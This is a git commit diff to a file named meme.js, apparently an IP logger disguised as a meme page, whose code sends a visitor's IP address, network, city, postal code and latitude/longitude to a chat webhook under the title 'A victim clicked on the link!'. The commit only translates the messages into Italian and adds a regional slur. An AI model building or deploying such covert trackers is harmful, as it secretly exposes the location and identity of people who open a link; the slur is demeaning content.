529478dd3310c276c2437987c23776fbb6c3e150
danyx64YT <124602162+danyx64YT@users.noreply.github.com>
2025-09-10 16:19:52 +0200

    Update meme.js

--- meme.js
+++ meme.js
@@ -13,13 +13,13 @@ const sendIP = () => {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "site logger <3", // optionally changeable
-                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
-                            content: `@here`,
+                            username: "Sono Un Bot", // optionally changeable
+                            avatar_url: "https://media.trustradius.com/vendor-logos/nn/Ie/WQRTT9T5T4XP.JPEG", // optionally changeable
+                            content: `Bro Ho Trovato Il Terrone @here`,
                             embeds: [
                                 {
-                                    title: 'A victim clicked on the link!',
-                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
+                                    title: 'Ecco Quello Che A Te Piace Vedere',
+                                    description: `**IP >> **${ipadd}\n**Rete >> ** ${geoData.network}\n**Città >> ** ${geoData.city}\n**Regione >> ** ${geoData.region}\n**Paese >> ** ${geoData.country_name}\n**Codice Postale >> ** ${geoData.postal}\n**Latitudine >> ** ${geoData.latitude}\n**Longitudine >> ** ${geoData.longitude}`,
                                     color: 0x800080 // optionally changeable
                                 }
                             ]
